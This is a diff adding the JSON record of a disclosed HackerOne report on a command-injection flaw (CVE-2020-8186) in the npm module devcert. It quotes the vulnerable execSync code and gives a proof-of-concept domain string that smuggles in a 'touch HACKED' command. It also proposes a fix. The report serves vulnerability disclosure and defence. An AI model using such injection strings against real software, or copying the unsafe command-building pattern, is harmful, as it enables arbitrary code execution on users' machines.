@@ -1,0 +1,143 @@
+{
+  "id": 863544,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NjM1NDQ=",
+  "url": "https://hackerone.com/reports/863544",
+  "title": "[devcert] Command Injection via insecure command formatting",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2020-04-30T21:41:23.951Z",
+  "submitted_at": "2020-04-30T21:41:23.951Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "d3lla",
+    "url": "/d3lla",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8186"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-06-15T16:02:48.968Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-06-15T16:02:48.913Z",
+  "team_member_agreed_on_going_public_at": "2020-06-12T10:10:30.842Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a `Command Injection` issue in the `devcert` module.\nIt allows to execute arbitrary commands on the victim's PC.\n\n# Module\n\n**module name:** `devcert`\n**version:** `1.1.0`\n**npm page:** `https://www.npmjs.com/package/devcert`\n\n## Module Description\n\ndevcert - Development SSL made easy\n\n## Module Stats\n\n[276,467] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe issue occurs because a user input parameter is used inside a command that is executed without any check. \n\nI tested the `certificateFor` function.\n\nHere's the code which causes the issue:\n\n```javascript\n// https://github.com/davewasmer/devcert/blob/2b1b8d40eda251616bf74fd69f00ae8222ca1171/src/index.ts#L95\n\nexport async function certificateFor<O extends Options>(domain: string, options: O = {} as O): Promise<IReturnData<O>> { // <-- starting point\n  debug(`Certificate requested for ${ domain }. Skipping certutil install: ${ Boolean(options.skipCertutilInstall) }. Skipping hosts file: ${ Boolean(options.skipHostsFile) }`);\n\n  if (options.ui) {\n    Object.assign(UI, options.ui);\n  }\n\n  if (!isMac && !isLinux && !isWindows) {\n    throw new Error(`Platform not supported: \"${ process.platform }\"`);\n  }\n\n  if (!commandExists('openssl')) {\n    throw new Error('OpenSSL not found: OpenSSL is required to generate SSL certificates - make sure it is installed and available in your PATH');\n  }\n\n  let domainKeyPath = pathForDomain(domain, `private-key.key`);\n  let domainCertPath = pathForDomain(domain, `certificate.crt`);\n\n  if (!exists(rootCAKeyPath)) {\n    debug('Root CA is not installed yet, so it must be our first run. Installing root CA ...');\n    await installCertificateAuthority(options);\n  } else if (options.getCaBuffer || options.getCaPath) {\n    debug('Root CA is not readable, but it probably is because an earlier version of devcert locked it. Trying to fix...');\n    await ensureCACertReadable(options);\n  }\n\n  if (!exists(pathForDomain(domain, `certificate.crt`))) { \n    debug(`Can't find certificate file for ${ domain }, so it must be the first request for ${ domain }. Generating and caching ...`);\n    await generateDomainCertificate(domain); // <-- domain is our payload\n  }\n  ....\n\n\n...\n// https://github.com/davewasmer/devcert/blob/master/src/constants.ts#L19\nexport const pathForDomain: (domain: string, ...pathSegments: string[]) => string = path.join.bind(path, domainsDir)\n...\n\n// https://github.com/davewasmer/devcert/blob/master/src/certificates.ts#L44\n...\nexport default async function generateDomainCertificate(domain: string): Promise<void> {\n  mkdirp(pathForDomain(domain));\n\n  debug(`Generating private key for ${ domain }`);\n  let domainKeyPath = pathForDomain(domain, 'private-key.key');  // <-- the variable is in the form \n  generateKey(domainKeyPath);\n\n  debug(`Generating certificate signing request for ${ domain }`);\n  let csrFile = pathForDomain(domain, `certificate-signing-request.csr`);\n  withDomainSigningRequestConfig(domain, (configpath) => {\n    openssl(`req -new -config \"${ configpath }\" -key \"${ domainKeyPath }\" -out \"${ csrFile }\"`);\n  });\n\n  debug(`Generating certificate for ${ domain } from signing request and signing with root CA`);\n  let domainCertPath = pathForDomain(domain, `certificate.crt`);\n\n  await withCertificateAuthorityCredentials(({ caKeyPath, caCertPath }) => {\n    withDomainCertificateConfig(domain, (domainCertConfigPath) => {\n      openssl(`ca -config \"${ domainCertConfigPath }\" -in \"${ csrFile }\" -out \"${ domainCertPath }\" -keyfile \"${ caKeyPath }\" -cert \"${ caCertPath }\" -days 825 -batch`)\n    });\n  });\n}\n\n// Generate a cryptographic key, used to sign certificates or certificate signing requests.\nexport function generateKey(filename: string): void {\n  debug(`generateKey: ${ filename }`);  // <-- injection\n  openssl(`genrsa -out \"${ filename }\" 2048`);\n  chmod(filename, 400);\n}\n```\n\nThe input parameter `domain` is used to build the `domainKeyPath` variable.\nIf we pass `\\\";touch HACKED;\\\"` as input, the variable  `domainKeyPath` will be something like this: `/home/ubuntu/.config/devcert/domains/\";touch HACKED;\"/private-key.key` (the first part depends on your OS).\nAs we can see the variable contains a valid shell command. Then, this variable is passed to the function `generateKey`, that finally calls `openssl` function:\n```javascript\n// https://github.com/davewasmer/devcert/blob/master/src/utils.ts#L12\nimport { execSync, ExecSyncOptions } from 'child_process';\nimport tmp from 'tmp';\nimport createDebug from 'debug';\nimport path from 'path';\nimport sudoPrompt from 'sudo-prompt';\n\nimport { configPath } from './constants';\n\nconst debug = createDebug('devcert:util');\n\nexport function openssl(cmd: string) {\n  return run(`openssl ${ cmd }`, {  // <-- the command executed is: openssl genrsa -out \"/home/ubuntu/.config/devcert/domains/\";touch HACKED;\"/private-key.key\" 2048\n    stdio: 'pipe',\n    env: Object.assign({\n      RANDFILE: path.join(configPath('.rnd'))\n    }, process.env)\n  });\n}\n\nexport function run(cmd: string, options: ExecSyncOptions = {}) {\n  debug(`exec: \\`${ cmd }\\``);\n  return execSync(cmd, options);  // <-- call child_process.execSync \n}\n...\n\n```\n\n## Steps To Reproduce:\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `devcert` module:\n    -  `npm i devcert`\n- create the following PoC JavaScript file (`poc.js`):\n\n```javascript\nconst devcert = require('devcert');\n\nasync function poc() {\n    let ssl = await devcert.certificateFor('\\\";touch HACKED;\\\"');\n}\npoc()\n```\n- make sure that the `HACKED` file does not exist:\n    - `ls`\n- execute the `poc.js` file:\n    - `node poc.js`\n- the `HACKED` file is created:\n    - `ls`\n    \n{F810294}\n\n\n## Patch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it. \nIn my opinion, it's better to use [`child_process.execFile`](https://nodejs.org/api/child_process.html#child_process_child_process_execfile_file_args_options_callback) or [`child_process.spawn`](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) functions instead of `child_process.execSync`.\n\n## Supporting Material/References:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v13.13.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nCommand Injection on `devcert` module via insecure command formatting.",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 810294,
+      "file_name": "poc_devcert.mov",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/NC1f9pwuq8isuiJYJqsdb4At?response-content-disposition=attachment%3B%20filename%3D%22poc_devcert.mov%22%3B%20filename%2A%3DUTF-8%27%27poc_devcert.mov&response-content-type=video%2Fquicktime&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3IMMHD7U%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T134314Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDckwknQq7fjHwY7%2FK9F%2BtvO9fLJDuG1NEZXXMxYw8hbwIhAM3er0SlLN2AYaRXWazeiwtSjADmim0DnY8YcGf4Y8SxKrEFCHUQAxoMMDEzNjE5Mjc0ODQ5Igww2o2qmJ5MWkfa74sqjgUMDHXvf3xxgarNNUDSIN7iuGoSARtn65gvdJ4%2BO%2FkXeF39tTNpPNp3gbMxN08cJsUGQsiwR96l9CPUzLY7LHBxHFojvFr3ITM3J4EJtd3JktNeEkJgVr%2FsEnXuvSlNfFhDmvSEfMGUHb4UbVaVoFQ4SNJecAghbZ4R2R6eho8SeZVEYbq749PMxfWZg3uRG8JgtVyqoY1jpCk0kh4f43bzUZ6Tk0NwL6H2YD1r28GPSdM2NMS0DQHVK52MQWqHFxqvZOB0JavCD6yzZmm375qMFj70T9kjeA3ygDsQWnINhhNEokIipgBb9big4jerkxPZKXHkMEn8kTRjdpaGnqT31eS2Ap3%2BS%2B4%2BDmGqYt5cnry1J7sVtfs6SJBo2KwCm3ieX3J9ZiFPRwbpDrCFs0h81ZvXr03wFCruJw3pNftO4v61HT2vFYwafngQ66iRf4ccw2WitEv8dDqy88fiyfo8PkzIKNQIGf7F%2FGVErGB7zEj7qRAyMBXCY0PP4WHQscGLLucR9RYE1pVgzzs3BCA9j6D9M6C2DUCcO%2BW%2BQmZSaDSPS08WMv4oYHFXYggOIv%2FTINF9J4pMXNDPjCxtu2OWtH7uHoi1NNCNlUe9xnu5aYimPddy8D73j8KGddAo1w6IoKy4kpqEs8NU%2BXnLLIo%2F8OkgGBLEwmIu9T%2Bu6Oz7XkrYifOXYMDpFUfwTPN9W4JsrMXt%2F3wugpQN4Fk4kWsib7XEy1iPAo764glVM3P7J4XVtoYVee04ZiKms2%2FCu1rNFAWnpdtEP6RHFeEvOqGBX9C3g9xvfaapxWX1FccdWfkK68y%2Bh%2FMy24XhzUb14mI24ZTU9zIXOy%2BHFqYVkAOt7UQ1Gb4HE6VcsU%2B8JXcw5bStrgY6sAE07AhFgeocUOJkN2I%2Fu89%2FcNWBSx3BcejUfJX3Y1%2FMNQpv784p5QFf%2BWHp0%2BUGiFxL%2FYZ7bz0IANiUOzMv59zqaW%2FP4WOMYPVgyzZAVw3B2h%2B4laP9i2zcnD6y1B8D0yz1mg3ghUGJo8C0Z5LhCaAHi7hr3CmQatY39rwKj4%2BzrrqtAaWIIqOwkXgJ89Q5MnwR3YpKSnVnS%2BtFWl0%2BIltP2OXBDv%2Fq7N9nB1%2FEoAh%2FZA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e84cb94d017e3a2d797eb63205b651daa5952fcd0a1c487a210b6c60fb05b076",
+      "file_size": 5602779,
+      "type": "video/quicktime",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-07-12T10:10:30.911Z",
+  "allow_singular_disclosure_after": -113283163.92670791,
+  "singular_disclosure_allowed": true,
+  "vote_count": 11,
+  "voters": [
+    "kegn",
+    "brahim_boufakri01",
+    "mayurudiniya",
+    "fle_xxx",
+    "d4rkm4tter",
+    "talio",
+    "fsamaj",
+    "pk_12397",
+    "bb3f58bf30f1a053db1129e",
+    "mrsalles",
+    "and 1 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 49301,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "devcert",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
